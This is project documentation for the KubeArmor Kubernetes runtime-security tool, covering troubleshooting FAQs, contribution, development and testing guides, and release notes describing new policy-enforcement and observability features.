#### Use grubby if GRUB method fails (RHEL 9.x preferred)

* Add parameters to all kernels

  ```
  sudo grubby --update-kernel=ALL --args="lsm=selinux,integrity,yama,lockdown,bpf"
  ```

* Verify the change

  ```
  sudo grubby --info=ALL | grep args
  ```

* Reboot into your kernel

  ```
  sudo reboot
  ```

</details>

<details>

<summary><strong>ICMP block/audit does not work with AppArmor as the enforcer</strong></summary>

There is some problem with AppArmor due to which ICMP rules don't work as expected.

The KubeArmor team has brought this to the attention of the [AppArmor community](https://stackoverflow.com/questions/76768503/apparmor-deny-icmp-issue) on StackOverflow and await their response.

In the same environment we've found that ICMP rules with BPFLSM work as expected.

For more such differences checkout [Enforce Feature Parity Wiki](https://github.com/kubearmor/KubeArmor/wiki/Enforcer-Feature-Parity).

</details>

<details>

<summary><strong>How to enable `KubeArmorHostPolicy` for k8s cluster?</strong></summary>

By default the host policies and visibility is disabled for k8s hosts.

If you use following command, `kubectl logs -n kubearmor <KUBEARMOR-POD> | grep "Started to protect"`\
you will see, `2023-08-21 12:58:34.641665 INFO Started to protect containers.`\
This indicates that only container/pod protection is enabled.\
If you have hostpolicy enabled you should see something like this, `2023-08-22 18:07:43.335232 INFO Started to protect a host and containers`<br>

One can enable the host policy by patching the daemonset (`kubectl edit daemonsets.apps -n kubearmor kubearmor`):

```diff
...
  template:
    metadata:
      annotations:
        container.apparmor.security.beta.kubernetes.io/kubearmor: unconfined
      creationTimestamp: null
      labels:
        kubearmor-app: kubearmor
    spec:
      containers:
      - args:
        - -gRPC=32767
+       - -enableKubeArmorHostPolicy
+       - -hostVisibility=process,file,network,capabilities
        env:
        - name: KUBEARMOR_NODENAME
          valueFrom:
            fieldRef:
              apiVersion: v1
              fieldPath: spec.nodeName
...
```

This will enable the `KubeArmorHostPolicy` and host based visibility for the k8s worker nodes.

</details>

<details>

<summary><strong>Using KubeArmor with Kind clusters</strong></summary>

KubeArmor works out of the box with Kind clusters supporting BPF-LSM. However, with AppArmor only mode, Kind cluster needs additional provisional steps. You can check if BPF-LSM is supported/enabled on your host (on which the kind cluster is to be deployed) by using following:

```
cat /sys/kernel/security/lsm
```

* If it has `bpf` in the list, then everything should work out of the box
* If it has `apparmor` in the list, then follow the steps mentioned in this FAQ.

### 1. Create Kind cluster

```sh
cat <<EOF | kind create cluster --config -
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- extraMounts:
  - hostPath: /sys/kernel/security
    containerPath: /sys/kernel/security
EOF
```

### 2. Exec into kind node & install apparmor util

```sh
docker exec -it kind-control-plane bash -c "apt update && apt install apparmor-utils -y && systemctl restart containerd"
```

The above command will install the AppArmor utilities in the kind-control-plane, we can also use this command to install these in minikube as well as in all the other docker based Kubernetes environments.

After this, exit out of the node shell and follow the [getting-started guide](https://docs.kubearmor.io/kubearmor/quick-links/deployment_guide).

It might be possible that apart from the dockerized kubenetes environment AppArmor might not be available on the master node itself in the Kubernetes cluster. To check for the same you can run the below command to check for the AppArmor support in kernel config:

```
cat /boot/config-$(uname -r) | grep -e "APPARMOR"
```

Following flags need to exist and set to `y`

```ini
CONFIG_SECURITY_APPARMOR=y
```

Run the command to install apparmor:

```
apt update && apt install apparmor-utils -y
```

You need to restart your CRI in-order to make APPARMOR available as a kernel config security.

If not then we need to install AppArmor utils on the master node itself.

If the `kubearmor-relay` pod goes into CrashLoopBackOff, apply the following patch:

```sh
kubectl patch deploy -n $(kubectl get deploy -l kubearmor-app=kubearmor-relay -A -o custom-columns=:'{.metadata.namespace}',:'{.metadata.name}') --type=json -p='[{"op": "add", "path": "/spec/template/metadata/annotations/container.apparmor.security.beta.kubernetes.io~1kubearmor-relay-server", "value": "unconfined"}]'
```

</details>

<details>

<summary><strong>KubeArmor enforcement is not enabled/working</strong></summary>

KubeArmor enforcement mode requires support of LSMs on the hosts. Certain distributions might not enable it out of the box. There are two ways to check this:

1. During KubeArmor installation, it shows the following warning message:

```
KubeArmor is running in Audit mode, only Observability will be available and Policy Enforcement won't be available.
```

1. Another way to check it is using `karmor probe`. If the `Active LSM` shown is blank, then the enforcement won't work.

Following `updater` daemonset will enable the required LSM on the nodes (in the future if new nodes are dynamically added, those nodes will be auto enabled as well).

```
kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/deployments/controller/ka-updater-kured.yaml
```

> Note: Nodes who do not have necessary LSM will be restarted after the deployment of updater.

Once the nodes are restarted, `karmor probe` would then show `Active LSM` with appropriate value.

</details>

<details>

<summary><strong>KubeArmor with WSL2</strong></summary>

It is possible to deploy k3s on WSL2 to have a local cluster on your Windows machine. However, the WSL2 environment does not mount securityfs by default and hence `/sys/kernel/security` is not available by default. KubeArmor would still install on such system but without enforcement logic.

Thus with k3s on WSL2, you would still be able to run kubearmor but the block-based policies won't work. Using `karmor probe` would show `Active LSM` as blank which signals that the block-based policies won't work.

</details>

# Contribution Guide

KubeArmor maintainers welcome individuals and organizations from across the cloud security landscape (creators and implementers alike) to make contributions to the project. We equally value the addition of technical contributions and enhancements of documentation that helps us grow the community and strengthen the value of KubeArmor. We invite members of the community to contribute to the project!

To make a contribution, please follow the steps below.

1. Fork this repository (KubeArmor)

   First, fork this repository by clicking on the Fork button (top right).

   ![fork button](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-31ace0e1ca9700fcd558c5dde76a069beb593d66%2Ffork_button.png?alt=media)

   Then, click your ID on the pop-up screen.

   ![fork screen](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-03b203bcc453969a1ac366ad67b15405739b2316%2Ffork_screen.png?alt=media)

   This will create a copy of KubeArmor in your account.

   ![fork repo](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-9db3c66b4f008c794300b55376e8163825aa140c%2Fforked_repo.png?alt=media)
2. Clone the repository

   Now clone Kubearmor locally into your dev environment.

   ```
    git clone https://github.com/[your GitHub ID]/KubeArmor
   ```

   This will clone a copy of Kubearmor installed in your dev environment.
3. Make changes

   First, go into the repository directory and make some changes.

   Please refer to [development guide](https://docs.kubearmor.io/kubearmor/contribution/development_guide) to set up your environment for KubeArmor contribution.
4. Check the changes

   If you have changed the core code of KubeArmor then please run tests before committing the changes

   ```
   cd tests
   ~/KubeArmor/tests$ make
   ```

   If you see any warnings or errors, please fix them first.

   If some tests are failing, then fix them by following [Testing Guide](https://docs.kubearmor.io/kubearmor/contribution/testing_guide)

   If you have made changes in Operator or Controller, then follow [this](https://github.com/kubearmor/KubeArmor/blob/main/contribution/testing_operator_controller_guide.md)
5. Commit changes

   Please see your changes using "git status" and add them to the branch using "git add".

   ```
    $ cd KubeArmor
    ~/KubeArmor$ git status
    ~/KubeArmor$ git add [changed file]
   ```

   Then, commit the changes using the "git commit" command.

   ```
    ~/KubeArmor$ git commit -s -m "Add a new feature by [your name]"
   ```

   Please make sure that your changes are properly tested on your machine.
6. Push changes to your forked repository

   Push your changes using the "git push" command.

   ```
    ~/KubeArmor$ git push
   ```

7. Create a pull request with your changes with the following steps

   First, go to your repository on GitHub.

   ![commit ahead](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-c4388730105d037655e5a51e66e2d31e0a43cb74%2Fcommit_ahead.png?alt=media)

   Then, click "Pull request" button.

   ![after pull request](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-5204f70a9714d1fbbb6a217c6d79b5756fef7f4a%2Fafter_pull_request.png?alt=media)

   After checking your changes, click 'Create pull request'.

   ![open pull request](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-25b346f45e6ebd876878a843615c6c5764869acd%2Fopen_pull_request.png?alt=media)

   A pull request should contain the details of all commits as specific as possible, including "Fixes: #(issue number)".

   Finally, click the "Create pull request" button.

   The changes would be merged post a review by the respective module owners. Once the changes are merged, you will get a notification, and the corresponding issue will be closed.
8. DCO Signoffs

   To ensure that contributors are only submitting work that they have rights to, we are requiring everyone to acknowledge this by signing their work. Any copyright notices in this repo should specify the authors as "KubeArmor authors".

   To sign your work, just add a line like this at the end of your commit message:

   ```
   Signed-off-by: FirstName LastName <email@address.com>
   ```

   This can easily be done with the `-s` or `--signoff` option to `git commit`.

   By doing this, you state that the source code being submitted originated from you (see <https://developercertificate.org>).

# Development Guide

## Development

### 1. Vagrant Environment (Recommended)

> **Note** Skip the steps for the vagrant setup if you're directly compiling KubeArmor on the Linux host.\
> Proceed [here](#2-self-managed-kubernetes) to setup K8s on the same host by resolving any dependencies.

* Requirements

  Here is the list of requirements for a Vagrant environment

  ```
  Vagrant - v2.2.9
  VirtualBox - v6.1
  ```

  Clone the KubeArmor github repository in your system

  ```
  git clone https://github.com/kubearmor/KubeArmor.git
  ```

  Install Vagrant and VirtualBox in your environment, go to the vagrant path and run the setup.sh file

  ```
  $ cd KubeArmor/contribution/vagrant
  ~/KubeArmor/contribution/vagrant$ ./setup.sh
  ~/KubeArmor/contribution/vagrant$ sudo reboot
  ```

* VM Setup using Vagrant

  Now, it is time to prepare a VM for development.

  To create a vagrant VM

  ```
  ~/KubeArmor/KubeArmor$ make vagrant-up
  ```

  Output will show up as ...

  To get into the vagrant VM

  ```
  ~/KubeArmor/KubeArmor$ make vagrant-ssh
  ```

  Output will show up as ...

  To destroy the vagrant VM

  ```
  ~/KubeArmor/KubeArmor$ make vagrant-destroy
  ```

  * VM Setup using Vagrant with Ubuntu 21.10 (v5.13)

    To use the recent Linux kernel v5.13 for dev env, you can run `make` with the `NETNEXT` flag set to `1` for the respective make option.

    ```
    ~/KubeArmor/KubeArmor$ make vagrant-up NETNEXT=1
    ```

    You can also make the setting static by changing `NETNEXT=0` to `NETNEXT=1` in the Makefile.

    ```
    ~/KubeArmor/KubeArmor$ vi Makefile
    ```

### 2. Self-managed Kubernetes

* Requirements

  Here is the list of minimum requirements for self-managed Kubernetes.

  ```
  OS - Ubuntu 18.04
  Kubernetes - v1.19
  Docker - 18.09 or Containerd - 1.3.7
  Linux Kernel - v4.15
  LSM - AppArmor
  ```

  KubeArmor is designed for Kubernetes environment. If Kubernetes is not setup yet, please refer to [Kubernetes installation guide](https://github.com/kubearmor/KubeArmor/blob/main/contribution/self-managed-k8s/README.md).\
  KubeArmor leverages CRI (Container Runtime Interfaces) APIs and works with Docker or Containerd or CRIO based container runtimes. KubeArmor uses LSMs for policy enforcement; thus, please make sure that your environment supports LSMs (either AppArmor or bpf-lsm). Otherwise, KubeArmor will operate in Audit-Mode with no policy "enforcement" support.

  **Alternative Setup**

  You can try the following alternative if you face any difficulty in the above Kubernetes (kubeadm) setup.

  > **Note** Please make sure to set up the alternative k8s environment on the same host where the KubeArmor development environment is running.

  * K3s

    You can also develop and test KubeArmor on K3s instead of the self-managed Kubernetes.\
    Please follow the instructions in [K3s installation guide](https://github.com/kubearmor/KubeArmor/blob/main/contribution/k3s/README.md).
  * MicroK8s

    You can also develop and test KubeArmor on MicroK8s instead of the self-managed Kubernetes.\
    Please follow the instructions in [MicroK8s installation guide](https://github.com/kubearmor/KubeArmor/blob/main/contribution/microk8s/README.md).
  * No Support - Docker Desktops

    KubeArmor does not work with Docker Desktops on Windows and macOS because KubeArmor integrates with Linux-kernel native primitives (including LSMs).
* Development Setup

  In order to install all dependencies, please run the following command.

  ```
  $ cd KubeArmor/contribution/self-managed-k8s
  ~/KubeArmor/contribution/self-managed-k8s$ ./setup.sh
  ```

  [setup.sh](https://github.com/kubearmor/KubeArmor/blob/main/contribution/self-managed-k8s/setup.sh) will automatically install [BCC](https://github.com/iovisor/bcc/blob/master/INSTALL.md), [Go](https://go.dev/doc/install), [Protobuf](https://grpc.io/docs/protoc-installation/), and some other dependencies.

  Now, you are ready to develop any code for KubeArmor. Enjoy your journey with KubeArmor.

### 3. Environment Check

* Compilation

  Check if KubeArmor can be compiled on your environment without any problems.

  ```
  $ cd KubeArmor/KubeArmor
  ~/KubeArmor/KubeArmor$ make
  ```

  If you see any error messages, please let us know the issue with the full error messages through #kubearmor-development channel on CNCF slack.
* Execution

  In order to directly run KubeArmor in a host (not as a container), you need to run a local proxy in advance.

  ```
  kubectl proxy &
  ```

  Then, run KubeArmor on your environment.

  ```
  $ cd KubeArmor/KubeArmor
  ~/KubeArmor/KubeArmor$ make run
  ```

  > **Note** If you have followed all the above steps and still getting the warning `The node information is not available`, then this could be due to the case-sensitivity discrepancy in the actual hostname (obtained by running `hostname`) and the hostname used by Kubernetes (under `kubectl get nodes -o wide`).\
  > K8s converts the hostname to lowercase, which results in a mismatch with the actual hostname.\
  > To resolve this, change the hostname to lowercase using the command `hostnamectl set-hostname <lowercase-hostname>`.
* KubeArmor Controller

  Starting from KubeArmor v0.11 - annotations, container policies, and host policies are handled via kubearmor controller, the controller code can be found under `pkg/KubeArmorController`.

  To install the controller from KubeArmor docker repository run

  ```
  $ cd KubeArmor/pkg/KubeArmorController
  ~/KubeArmor/pkg/KubeArmorController$ make deploy
  ```

  To install the controller (local version) to your cluster run

  ```
  $ cd KubeArmor/pkg/KubeArmorController
  ~/KubeArmor/pkg/KubeArmorController$ make docker-build deploy
  ```

  if you need to setup a local registry to push you image, use `docker-registry.sh` script under `~/KubeArmor/contribution/local-registry` directory

## Code Directories

Here, we briefly give you an overview of KubeArmor's directories.

* Source code for KubeArmor (/KubeArmor)

  ```
  KubeArmor/
    BPF                  - eBPF code for system monitor
    common               - Libraries internally used
    config               - Configuration loader
    core                 - The main body (start point) of KubeArmor
    enforcer             - Runtime policy enforcer (enforcing security policies into LSMs)
    feeder               - gRPC-based feeder (sending audit/system logs to a log server)
    kvmAgent             - KubeArmor VM agent
    log                  - Message logger (stdout)
    monitor              - eBPF-based system monitor (mapping process IDs to container IDs)
    policy               - gRPC service to manage Host Policies for VM environments
    types                - Type definitions
  protobuf/              - Protocol buffer
  ```

* Source code for KubeArmor Controller (CRD)

  ```
  pkg/KubeArmorController/  - KubeArmorController generated by Kube-Builder for KubeArmor Annotations, KubeArmorPolicy and KubeArmorHostPolicy
  ```

* Deployment tools and files for KubeArmor

  ```
  deployments/
    <cloud-platform-name>   - Deployments specific to respective cloud platform (deprecated - use karmor install or helm)
    controller              - Deployments for installing KubeArmorController alongwith cert-manager
    CRD                     - KubeArmorPollicy and KubeArmorHostPolicy CRDs
    get                     - Stores source code for deploygen, a tool used for specifying kubearmor deployments
    helm/
        KubeArmor           - KubeArmor's Helm chart
        KubeArmorOperator   - KubeArmorOperator's Helm chart
  ```

* Files for testing

  ```
  examples/     - Example microservices for testing
  tests/        - Automated test framework for KubeArmor
  ```

# Testing Guide

## Testing Guide

There are two ways to check the functionalities of KubeArmor: 1) testing KubeArmor manually and 2) using the testing framework.

## 0. Make sure Kubernetes cluster is running

Although there are many ways to run a Kubernetes cluster (like minikube or kind), it will not work with locally developed KubeArmor. KubeArmor needs to be on the same node as where the Kubernetes nodes exist. If you try to do this it will not identify your node since minikube and kind use virtualized nodes. You would either need to build your images and deploy them into these clusters or you can simply use `k3s` or `kubeadm` for development purposes. If you are new to these terms then the easiest way to do this is by following this guide: [K3s installation guide](https://github.com/kubearmor/KubeArmor/blob/main/contribution/k3s/README.md)

### 0.1. Firstly Run 'kubectl proxy' in background

```
kubectl proxy &
```

### 0.2. Now run KubeArmor

```
~/KubeArmor/KubeArmor$ make run
```

## 1. Test KubeArmor manually

### 1.1. Run 'kubectl proxy' in background

```
kubectl proxy &
```

### 1.2. Compile KubeArmor

```
$ cd KubeArmor/KubeArmor
~/KubeArmor/KubeArmor$ make clean && make
```

### 1.3. Run KubeArmor

```
~/KubeArmor/KubeArmor$ sudo -E ./kubearmor -gRPC=[gRPC port number]
                                           -logPath=[log file path]
                                           -enableKubeArmorPolicy=[true|false]
                                           -enableKubeArmorHostPolicy=[true|false]
```

### 1.4. Apply security policies into Kubernetes

Beforehand, check if the KubeArmorPolicy and KubeArmorHostPolicy CRDs are already applied.

```
kubectl explain KubeArmorPolicy
```

If they are still not applied, do so.

```
kubectl apply -f ~/KubeArmor/deployments/CRD/
```

Now you can apply specific policies.

```
kubectl apply -f [policy file]
```

You can refer to security policies defined for example microservices in [examples](https://github.com/kubearmor/KubeArmor/blob/main/examples/README.md).

### 1.5. Trigger policy violations to generate alerts

```
kubectl -n [namespace name] exec -it [pod name] -- bash -c [command]
```

### 1.6. Check generated alerts

* Watch alerts using [karmor](https://github.com/kubearmor/kubearmor-client) cli tool

  ```
  karmor log [flags]
  ```

  flags:

  ```
  --gRPC string        gRPC server information
  --help               help for log
  --json               Flag to print alerts and logs in the JSON format
  --logFilter string   What kinds of alerts and logs to receive, {policy|system|all} (default "policy")
  --logPath string     Output location for alerts and logs, {path|stdout|none} (default "stdout")
  --msgPath string     Output location for messages, {path|stdout|none} (default "none")
  ```

  Note that you will see alerts and logs generated right after `karmor` runs logs; thus, we recommend to run the above command in other terminal to see logs live.

## 2. Test KubeArmor using the auto-testing framework

* The case that KubeArmor is directly running in a host

  Compile KubeArmor

  ```
  $ cd KubeArmor/KubeArmor
  ~/KubeArmor/KubeArmor$ make clean && make
  ```

  Run the auto-testing framework

  ```
  $ cd KubeArmor/tests
  ~/KubeArmor/tests$ ./k8s_env/test-scenarios-local.sh
  ```

  Check the test report

  ```
  ~/KubeArmor/tests$ cat /tmp/kubearmor.test
  ```

* The case that KubeArmor is running as a daemonset in Kubernetes

  Run the testing framework

  ```
  $ cd KubeArmor/tests
  ~/KubeArmor/tests$ ./k8s_env/test-scenarios-in-runtime.sh
  ```

  Check the test report

  ```
  ~/KubeArmor/tests$ cat /tmp/kubearmor.test
  ```

* To run a specific suit of tests move to the directory of test and run

  ```
  ~/KubeArmor/tests/test_directory$ ginkgo --focus "Suit_Name"
  ```

# Releases

# v1.6

We are excited to announce the release of **KubeArmor v1.6**, packed with powerful new features, significant enhancements, and critical bug fixes that make workload protection and observability even more robust for cloud-native environments.

This release reflects major advancements in policy enforcement, system monitoring, and ecosystem integrations while addressing important stability and performance improvements.

### [Watch the KubeArmor v1.6 Release Overview](https://www.youtube.com/watch?v=lNXBwXRH-TQ)

![KubeArmor v1.6 Release](https://github.com/user-attachments/assets/fbd6545c-2a7a-4ae4-91f5-87242a5b1c37)

## Key Features & Enhancements

### 🔐 **Advanced Process Arguments Matching**

* Introduced **argument-based matching for processes** in policies.
* Allows precise control over command-line arguments, enabling granular process enforcement.
* This feature is currently limited to BPFLSM.
* **Example policy:**

  ```yaml
  apiVersion: security.kubearmor.com/v1
  kind: KubeArmorPolicy
  metadata:
    name: allow-steampipe-args
  spec:
    selector:
      matchLabels:
        app: steampipe
    process:
      matchPaths:
      - path: /usr/bin/python3.6
        allowedArgs:
          - -m
          - modules.steampipe_aws
    action: Block
  ```

### ➕ **Add support for non-Kubernetes installation through the KubeArmor client**

### 📡 **DNS Visibility at Pod-Level**

* Added **DNS query tracing** on UDP to provide insights into domain lookups from workloads.
* Helps detect malicious behaviors like **DGA (Domain Generation Algorithms)** or unauthorized C2 communications.

### 🛡️ **New Policy Presets**

* **ProtectProc:** Blocks unauthorized access to the `/proc` directory by non-owner processes.
* **ProtectEnv:** Prevents unauthorized access to sensitive environment variables in `/proc/[pid]/environ`.
* **ExecPreset:** Enforces restrictions on external process executions (e.g., via `kubectl exec`).

### 🔌 **Container Runtime Enhancements**

* **OCI Hooks Support:**
  * Added support for **containerd** and **CRI-O hooks**, eliminating the need for exposing runtime UNIX sockets for container events.

### 📈 **Improved Telemetry and Observability**

* Added **TTY information** in BPF-LSM generated telemetry.
* Enhanced telemetry with **network metadata** using Kubernetes informers.
* Extended alert resources to include **full command arguments**.

### 🌐 **Ecosystem and Integrations**

* **OpenSearch Support:** Added OpenSearch as a datasource for process graphs in Grafana dashboards.
* Integrated **image vulnerability scanning workflows** (via Trivy) in release pipelines.

## 🛠️ Bug Fixes and Stability Improvements

* Resolved **memory leaks** in AppArmor DaemonSet (observed in AKS clusters).
* Fixed **policy deletion logic** for recommended policies in the operator.
* Addressed **KubeArmorClusterPolicy enforcement issue** for pods created post-policy application.
* Fixed panic errors with uninitialized Docker daemons.
* Resolved **tolerations propagation issues** in Helm chart deployments.
* Improved filtering logic in `karmor profile` commands to respect namespace, pod, and container filters.
* Fixed PID/HostPID and PPID/HostPPID display anomalies (e-notation issues).

## ⚙️ Additional Improvements

* Helm charts updated to handle tolerations properly.
* Introduced **conditional deployment** of pod refresh controllers.
* Updated CI pipelines to use Ubuntu 22.04 runners and separated network tests for newer kernels.
* Deprecated legacy Config Watcher in favor of **karmor.yaml configuration**.

## 🚨 Breaking Changes

* **Preset API Specification Updated:**
  * Action is now defined per-preset level:

    ```yaml
    presets:
      - name: protectEnv
        action: Block
    ```

* Configuration changes via `karmor.yaml` will eventually replace existing ConfigMap fields.

## 📖 Documentation Updates

* Revised hardening policies and presets documentation.
* Updated multi-OS deployment instructions and CLI long descriptions.
* Added ModelArmor use-cases and a better getting started guide

## ✅ Upgrade Notes

* Users are advised to review preset configurations and update CRDs accordingly.
* When upgrading from v1.5, ensure Helm charts are updated to leverage new toleration handling and configuration management features.

## 📌 Contributors

This release wouldn’t have been possible without the incredible contributions from the community. Special thanks to all contributors for feature development, bug fixes, and reviews. 🙌

## 🔗 Resources

* 📚 [KubeArmor Documentation](https://docs.kubearmor.io/)
* 🛠️ [GitHub Repository](https://github.com/kubearmor/KubeArmor)
* 📝 [Changelog](https://github.com/kubearmor/KubeArmor/releases)

# v1.5

KubeArmor v1.5 delivers significant advancements in runtime security for Kubernetes environments. This release introduces **enhanced policy enforcement**, **streamlined management**, and **improved observability**, making it easier to secure workloads effectively.

This version expands platform support, optimizes performance, and introduces **new features** like network policy enforcement and host security hardening, along with integrations for a seamless security experience.

📺 **Watch the v1.5 Feature Showcase Livestream:** [Cloud Native Live: What's latest in KubeArmor v1.5 ![{CD5D95DA-0334-495D-8B02-4DBDC0521604}](https://github.com/user-attachments/assets/12792d48-cfb0-4354-9e60-c70676b27382)](https://youtu.be/OUNEu3h2V3c)

## 🔑 Key Highlights

* **Runtime Protection for Kubernetes Clusters** Secure clusters at runtime with **fine-grained policies** to prevent unauthorized access and block malicious activity.
* **Cluster-wide Security Policies** Support for **cluster-level policies** enables security enforcement beyond namespaces for organization-wide protection. KubeArmor enforces **Cluster Security Policies (CSPs)** that allow you to define security controls across the entire cluster. CSPs provide a unified way to manage container workloads at scale, enabling global policy enforcement across namespaces.

  📄 [Specification of Cluster Security Policy for Containers](https://docs.kubearmor.io/kubearmor/documentation/cluster_security_policy_specification) 📝 [Examples of Cluster Security Policy](https://docs.kubearmor.io/kubearmor/documentation/cluster_security_policy_examples)
* **KubeArmor Presets** Simplify security policy deployment with **predefined policy templates** for common use cases like:
  * Blocking fileless execution
  * Protecting environment variables
  * Auditing and *blocking* `kubectl exec` commands To use presets, specify the `preset-rule` field in your `KubeArmorPolicy`. [Learn more here.](https://github.com/kubearmor/KubeArmor/issues/1295)
* **Minikube and Killercoda Playground Support** Set up quick test environments for demos and PoCs effortlessly.
* **Support for SCTP and All Protocols** Added the ability to handle SCTP protocol and all protocols with raw socket, including `protocol: all` network rule. *(Contributed by* [*@rksharma95*](https://github.com/rksharma95) *in* [*#1892*](https://github.com/kubearmor/KubeArmor/pull/1892)*)*
* **OpenSSF Scorecard Improvements** Reduced attack surfaces and enhanced compliance by optimizing **SecComp profiles** and minimizing host exposure.
* **NRI Handler Support** Implemented NRI (Network Resource Interface) handler to extend runtime integrations. *(Contributed by* [*@dqsully*](https://github.com/dqsully) *in* [*#1674*](https://github.com/kubearmor/KubeArmor/pull/1674)*)*

## 🛠 Improvements

* **Cluster Name Detection** Auto-fetch cluster names for **easier multi-cluster management**.
* **Docker ImagePull Secrets** Improved management of Docker credentials for smoother deployments.
* **Fileless Execution Handling** Added **special presets** to manage and prevent fileless attacks.
* **Containerd API Refactor** Upgraded to v2 API for better performance and stability.
* **RBAC Enhancements** Introduced **flag-based RBAC rules** and refined operator configurations.
* **Deprecation of kube-rbac-proxy** Replaced with built-in controller authentication for **streamlined security configuration**.
* **Improved Controller Annotation Logic** Enhanced handling of pod deletions in the KubeArmor controller for better reliability. *(Contributed by* [*@Aryan-sharma11*](https://github.com/Aryan-sharma11) *in* [*#1952*](https://github.com/kubearmor/KubeArmor/pull/1952)*)*
* **Optimized Memory Usage** Reduced memory overhead in `os.readlink` operations to improve efficiency. *(Contributed by* [*@Aryan-sharma11*](https://github.com/Aryan-sharma11) *in* [*#1996*](https://github.com/kubearmor/KubeArmor/pull/1996)*)*
* **Exclude Labels in Endpoint Matching** Added support for excluding labels in CSP and KSP endpoint matching for flexible policy scoping. *(Contributed by* [*@Prateeknandle*](https://github.com/Prateeknandle) *in* [*#1999*](https://github.com/kubearmor/KubeArmor/pull/1999)*)*

## 🐞 Bug Fixes

* Fixed conditional mount issues for operator consistency.
* Enhanced log handling for cases where process names were missing.
* Improved build system by injecting version info into systemd packages.
* Added `go-get-tool` function to operator Makefile for more stable builds.
* Fixed network event returned values for more accurate monitoring. *(Contributed by* [*@rksharma95*](https://github.com/rksharma95) *in* [*#2042*](https://github.com/kubearmor/KubeArmor/pull/2042)*)*

## 📖 Documentation Updates

* **Talos Support** Updated FAQ and guides for Talos environments, ensuring all platforms are well-documented.

📄 [Full CHANGELOG for v1.5](https://github.com/kubearmor/KubeArmor/releases/tag/v1.5.0)

KubeArmor continues to **harden cloud-native environments**, enforcing least-permissive access and monitoring critical paths for Kubernetes, containerized, and bare-metal workloads.

👉 **Join the Community:**

* [Slack](https://cloud-native.slack.com/archives/C02R319HVL3)
* [CNCF Project Page](https://www.cncf.io/projects/kubearmor/)
* [GitHub Repository](https://github.com/kubearmor/KubeArmor)

# v1.4

[KubeArmor Operator as the Default Installation Method](#kubearmor-operator-as-the-default-installation-method)

[Capabilities Enforcement with BPF LSM](#capabilities-enforcement-with-bpf-lsm)

[Execname Matching in KubeArmor Policies](#execname-matching-in-kubearmor-policies)

[Securing KubeArmor](#securing-kubearmor)

[Additional Columns for KubeArmor Policies](#additional-columns-for-kubearmor-policies)

[Support for Alibaba Cloud](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/release-notes/support-for-alibaba-cloud/README.md)

[Performance Improvements](#performance-improvements)

## Key Takeaways

* KubeArmor Operator is now the default installation method for KubeArmor, providing a more streamlined installation process.
* New features include support for capabilities enforcement using BPF LSM, execname matching in policies, and additional columns in KubeArmor Security Policies (KSPs) and Host Security Policies (HSPs).
* Security enhancements include securing KubeArmor itself with Seccomp profiles and implementing mutual TLS (mTLS) for secure gRPC communication
* Support for Alibaba Cloud deployments has been added.
* Performance improvements include filtering watched nodes and pods server-side to reduce overhead in large clusters.

### KubeArmor Operator as the Default Installation Method

Earlier we used to install KubeArmor through plain Kubernetes manfiests. In kubearmor-client a.k.a karmor, we had a heurisitics based mechanism for detecting the target environment and create KubeArmor manifests accordingly. In recent releases we've developed the KubeArmor Operator - a Kubernetes operator which gets the granular per-node configuration of target environments and accordingly creates KubeArmor manifests. We have been pushing on operator based installation, make it more stable and slowly migrating our docs and references to point towards it instead of the old method. Finally, with this release - we now have karmor using the operator based installation too.

**Issues:** <https://github.com/kubearmor/KubeArmor/issues/1256>

**PRs:** <https://github.com/kubearmor/kubearmor-client/pull/402>

### Capabilities Enforcement with BPF LSM

In Kubernetes environments, certain workloads may require specific Linux capabilities to function correctly. However, granting unnecessary capabilities can introduce security risks. Previously, KubeArmor had the ability to enforce policies on Linux capabiliites only when using the AppArmor enforcer, recently we've introduced the same in our distinguishing BPF LSM enforcer as well. This improves the feature parity between AppArmor and BPF-LSM and allows you to define policies that restrict or allow specific capabilities for your workloads, enhancing the overall security posture of your Kubernetes cluster.

**References:** [Restrict Capabilities Usecase](https://docs.kubearmor.io/kubearmor/use-cases/hardening#restrict-capabilities-do-not-allow-capabilities-that-can-be-leveraged-by-the-attacker)

**Issues:**

* <https://github.com/kubearmor/KubeArmor/issues/795>
* <https://github.com/kubearmor/KubeArmor/issues/1538>

**PRs:**

* <https://github.com/kubearmor/KubeArmor/pull/1543>

### Execname Matching in KubeArmor Policies

Identifying and blocking malicious or unauthorized applications running in your Kubernetes cluster can be a challenging task, especially when dealing with dynamic or obfuscated binaries. Previously, KubeArmor relied solely on file paths or other attributes to define policies, limiting its ability to detect and prevent the execution of specific binaries. To address this limitation, KubeArmor now supports matching executable names in its policies. This new feature enables you to create rules based on the name of the executable binary, allowing for more granular control over the applications running in your Kubernetes cluster. For example, you can now block or allow specific crypto-mining binaries like xmrig by matching their executable names. By introducing execname matching, KubeArmor provides an additional layer of security and control, enabling you to proactively detect and prevent the execution of known malicious or unauthorized binaries within your Kubernetes environment.

**References:** [Example Policy](https://github.com/kubearmor/KubeArmor/blob/main/tests/k8s_env/ksp/multiubuntu/ksp-ubuntu-1-block-proc-execname.yaml)

**Discussion:** <https://kubearmor.slack.com/archives/C01F9V3SEHY/p1709480346589829>

**PRs:** <https://github.com/kubearmor/KubeArmor/pull/1664>

### Securing KubeArmor

As a security project, it's crucial for KubeArmor itself to adhere to security best practices and minimize its attack surface. For this, we've been constantly making improvements through past releases. In this release

#### Seccomp

KubeArmor will now ship with a default seccomp profile of it's own to restrict the system calls it can make. The profile won't be activated by default as of now but in future releases we'll make it enabled by default.

#### Secure gRPC Communication with Mutual TLS

